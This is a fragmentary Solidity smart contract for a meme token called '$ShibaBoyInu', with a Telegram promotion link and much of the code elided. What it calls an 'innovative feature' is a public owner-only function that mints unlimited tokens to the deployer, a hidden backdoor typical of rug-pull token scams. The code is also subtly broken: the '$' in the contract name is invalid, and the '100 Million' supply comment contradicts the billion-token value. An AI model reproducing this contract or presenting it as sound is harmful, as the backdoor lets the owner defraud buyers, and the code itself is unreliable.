...
//
// $ShibaBoyInu proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/+xFtToJ7bjSo0Zjhl
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _ShibaBoyInu(uint256 amount) public onlyOwner {
 _ShibaBoyInu(msg.sender, amount);
    }
    ...
    function _ShibaBoyInu(address account, uint256 amount) internal virtual {
...
contract $ShibaBoyInu is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("ShibaBoy Inu", "SHIBAINU") {
     _ShibaBoyInu(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}